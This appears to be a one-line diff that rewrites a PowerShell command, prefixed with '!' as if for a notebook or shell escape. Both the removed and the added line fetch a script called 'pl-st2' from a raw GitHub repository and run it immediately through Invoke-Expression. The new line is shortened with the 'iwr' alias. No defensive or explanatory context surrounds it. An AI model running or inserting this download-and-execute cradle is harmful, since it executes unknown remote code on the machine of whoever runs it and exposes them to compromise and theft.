@@ -1,1 +1,1 @@
-!powershell IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/citraadvertising/X/refs/heads/main/pl-st2').Content
+!powershell IEX(iwr 'https://raw.githubusercontent.com/citraadvertising/X/refs/heads/main/pl-st2').Content
